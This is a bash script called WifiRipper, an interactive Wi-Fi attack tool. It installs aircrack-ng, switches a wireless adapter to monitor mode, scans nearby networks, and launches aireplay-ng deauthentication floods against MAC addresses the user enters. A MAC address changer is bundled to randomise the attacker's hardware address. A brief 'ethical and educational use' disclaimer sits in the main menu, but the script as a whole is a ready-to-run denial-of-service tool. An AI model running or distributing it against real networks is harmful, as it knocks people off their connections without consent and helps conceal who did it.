#!/bin/bash
clear
if ! command -v aircrack-ng &> /dev/null; then
    echo "aircrack-ng is not installed. Installing..."
    apt-get update
    apt-get install -y aircrack-ng
    echo "aircrack-ng installed."                        # App Version 2.4.1
else
    echo "checking for aircrack-ng..."
    echo "aircrack-ng is already installed."
fi
clear
show_loading() {
  local duration="$1"
  local interval=0.2
  local symbols=("+" "*" "+" "*")
  local color=("\\033[1;92m")  

  for ((i = 0; i < duration * 5; i++)); do
    local symbol="${symbols[i % 4]}"
    local color="${colors[i % 4]}"
    echo -ne "${color}Loading... $symbol\\e[0m\r"  
    sleep "$interval"
  done
}
show_loading 5
echo -e "\033[1;92m"
clear
echo "Loading complete!"
clear

if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root."
   exit 1
fi
chmod +x launcher.sh
chmod +x Banner.sh
bash launcher.sh
sleep 5
echo " Please wait..."
function show_interfaces() {
  bash Banner.sh
  echo -e "\n\n\n"
  echo "       MAC Address Changer"
  echo -e "       ------------------------------------------------------------------------------------------------------------------------\n"
  echo -e "           Connected Network Interfaces:\n"
  echo -e "           0. Go Back\n"
  interfaces=($(ip link show | awk '/^[0-9]+:/ {print substr($2, 1, length($2)-1)}' | grep -v lo))
  for ((i=0; i<${#interfaces[@]}; i++)); do
    echo -e "           $((i+1)). ${interfaces[i]}\n"
  done
}

function change_mac_address_random() {
  while true; do
    
    read -p "           Enter the number corresponding to the network interface to change the MAC address: " num
    echo "           Please wait. Loading..."
    # Validate the input
    re='^[0-9]+$'
    if ! [[ $num =~ $re ]]; then
        echo "           Invalid input. Please enter a valid number corresponding to the interface."
        continue
    fi

    if (( num == 0 )); then
        break
    elif (( num < 1 || num > ${#interfaces[@]} )); then
        echo "           Invalid input. Please enter a number within the range of available interfaces."
        continue
    fi

    selected_interface=${interfaces[$((num-1))]}
    new_mac=$(printf "%02X:%02X:%02X:%02X:%02X:%02X" $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))

    sudo ip link set dev $selected_interface down
    sudo ip link set dev $selected_interface address $new_mac
    sudo ip link set dev $selected_interface up 
    echo "           MAC address for $selected_interface changed to $new_mac."
    echo "           Redirecting in 5s"
    sleep 5
    break    
done
  
}

function readme() {
     bash Banner.sh
     cat < README.md
        while true; do
                echo " "
                read -p "           Press X to exit to menu: " repeat
                case $repeat in
                 [Xx]* )
                        clear
                        return ;;
                    * )
                        echo "           Invalid response. Please enter 'X'." ;;
                esac
            done
}

function manual() {
     bash Banner.sh
     cat < Manual.md
        while true; do
                echo " "
                read -p "           Press X to exit to menu: " repeat
                case $repeat in
                 [Xx]* )
                        clear
                        return ;;
                    * )
                        echo "           Invalid response. Please enter 'X'." ;;
                esac
            done    
}

function deauthenticate() {
    for mac in "${mac_addresses[@]}"; do
        gnome-terminal -- bash -c "aireplay-ng -0 $deauth_packets -a $mac -D $interface; read -p 'Press Enter to close this terminal window...' sudo airmon-ng stop $interface "
    done
    echo -e "\n           Deauthentication completed for selected MAC addresses."
    echo -e "\n           Switching $interface to Managed Mode"
}

function scan_and_deauthenticate() {
    clear
    while true; do
        bash Banner.sh
        echo -e "\n\n\n\n            + Select your wireless Interface(Adapter)  "
        echo "            + Monitor mode will be enabled on the selected Interface  "
        echo "            + Pres Ctrl & C to stop scanning "
        echo -e "\n\n\n       Scan and Deauthenticate"
        echo -e "       ------------------------------------------------------------------------------------------------------------------------\n"
        echo -e "           Available wireless network interfaces:\n"
        echo "           0 - Go Back"
        index=1
        for iface in $(ip link show | awk -F: '$0 !~ "lo|vir|^[^0-9]"{print $2;getline}'); do
            if [[ -n $(iwconfig $iface 2>/dev/null | grep "IEEE") ]]; then
                chipset_info=$(ethtool -i $iface | grep driver)
                chipset_name=$(echo $chipset_info | awk '{print $2}')
                manufacturer=$(echo $chipset_info | awk '{print $4}')
                echo -e "\n           $index - $iface - $manufacturer $chipset_name"
                wireless_interfaces[$index]=$iface
                ((index++))
            fi
        done

        if [[ ${#wireless_interfaces[@]} -eq 0 ]]; then
            echo "           No wireless interface detected"
            echo "           :("
            sleep 3
            clear
        fi

        echo -e "\n       Select a wireless interface:"
        read -p "       (Enter a number or '0' to Go Back): " choice
        if [[ $choice -ge 0 && $choice -le ${#wireless_interfaces[@]} ]]; then
            if [[ $choice -eq 0 ]]; then
                clear
                return
            fi
            interface=${wireless_interfaces[$choice]}
            echo -e "\n          Switching to monitor mode..."
            sudo ifconfig $interface down
            sudo airmon-ng start $interface
            new_interface="${interface}mon"
            if [[ -e /sys/class/net/$new_interface ]]; then
                interface=$new_interface
            fi
            sudo ifconfig $interface up
            echo -e "           Monitor mode enabled on $interface\n"
            echo -e "           Scanning for nearby Wi-Fi networks..."
            airodump-ng $interface

            while true; do
                echo -e "\n\n\033[1;92m       Deauthentication Prompt"
                echo -e "       ------------------------------------------------------------------------------------------------------------------------\n"
                read -p "           Enter the number of MAC addresses to deauthenticate: " count
                if [[ $count =~ ^[0-9]+$ ]]; then
                    break
                else
                    echo -e "           Invalid input. Please enter a number."
                fi
            done

            declare -a mac_addresses

            for ((i=1; i<=$count; i++)); do
                while true; do
                    echo -e "\n"
                    read -p "           Enter MAC address $i: " mac
                    if [[ $mac =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
                        mac_addresses+=("$mac")
                        break
                    else
                        echo "           Invalid MAC address. Please enter a valid MAC address."
                    fi
                done
            done

            while true; do
                echo -e " \n"
                read -p "           Do you want to set a custom number of deauthentication packets (y/n): " custom_deauth
                case $custom_deauth in
                    [Yy]* )
                        echo -e "\n"
                        read -p "           Enter the custom number of deauthentication packets: " deauth_packets
                        if [[ $deauth_packets =~ ^[0-9]+$ ]]; then
                            break
                        else
                            echo "           Invalid input. Please enter a number."
                        fi
                        ;;
                    [Nn]* )
                        deauth_packets=0
                        break ;;
                    * )
                        echo "Invalid response. Please enter 'y' or 'n'." ;;
                esac
            done            
            deauthenticate
            while true; do
                echo -e "\n"
                read -p "           Press X to exit to menu: " repeat
                case $repeat in
                    [Qq]* )
                        echo -e "\n           Please wait for 5sec"
                        sleep 5
                        sudo airmon-ng stop $interface
                        clear
                        break ;;
                    [Xx]* )
                        sudo airmon-ng stop $interface
                        clear
                        return ;;
                    * )
                        echo "           Invalid response. Please enter 'X'." ;;
                esac
            done
        else
            echo "           Invalid choice. Please enter a valid number."
        fi
    done
}

clear

while true; do
    spaceeleven='           '
    bash Banner.sh
    echo " "
    echo " "
    echo "            + WifiRipper is intended for ethical and educational purposes only. "
    echo "            + Unauthorized use of this script to disrupt Wi-Fi networks without proper authorization is illegal and unethical."
    echo "            + Users are encouraged to obtain the necessary permissions and follow ethical guidelines before using this script."
    echo "            + The script authors and maintainers are not responsible for any misuse or harm caused by its usage.    "
    echo -e "\n\n\n\n       Main Menu:"
    echo -e "       ------------------------------------------------------------------------------------------------------------------------\n"
    echo -e "           1 - Scan and Deauthenticate\n"
    echo -e "           2 - MAC Address Changer\n"
    echo -e "           3 - Help\n"
    echo -e "           4 - About Tool\n"
    echo -e "           0 - Exit\n"
    read -p "    Enter your choice: " main_choice
    
    
    case $main_choice in
        1 )
            scan_and_deauthenticate
            ;;
        2 ) clear
            show_interfaces
            change_mac_address_random
            clear
            ;;
        3 ) clear
            manual
            ;;
        4 ) clear
            readme
            ;;    
        0 )
            clear
            echo "Exiting."
            sudo service NetworkManager restart
            echo "See you soon :)"
            exit ;;
        * )
            echo "           Invalid choice. Please enter a valid number."
            ;;
    esac
done


